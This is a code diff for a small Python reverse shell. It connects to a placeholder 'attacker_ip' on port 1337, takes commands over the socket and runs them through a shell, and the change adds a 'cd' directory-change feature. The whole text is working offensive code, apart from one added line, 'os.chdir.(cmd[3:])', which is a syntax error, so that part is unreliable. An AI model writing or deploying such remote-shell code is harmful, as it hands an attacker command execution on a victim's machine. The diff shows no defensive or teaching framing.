@@ -1,6 +1,9 @@
 import socket
 import subprocess
 
+# import a library for change directory
+import os
+
 payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 payload.connect(("attacker_ip", 1337))
@@ -15,17 +18,20 @@ def send_data(ouput_data):
  
 while True:
 	cmd = payload.recv(2048)
+	cmd = cmd.decode("utf-8") # string
 	
-	if cmd == b"quit":
+	if cmd == "quit": # no longer need to decode with byte
 		payload.close()
 		break
-		
-	cmd = cmd.decode("utf-8") # string
+	
+	# Change Directory (cd)
+	elif cmd[:2] == "cd": # Check initial part (cd) slice using string [:index]
+		# use os module and chdir function (change directory)
+		os.chdir.(cmd[3:]) # give the command the 2nd argument after (cd)
+		continue
 
-	# Handle Exception
 	try:
 		output = subprocess.check_output(cmd, shell = True)
-	# Check if there's exception
 	except subprocess.CalledProcessError:
 		send_data(b"Wrong command")
 	else:
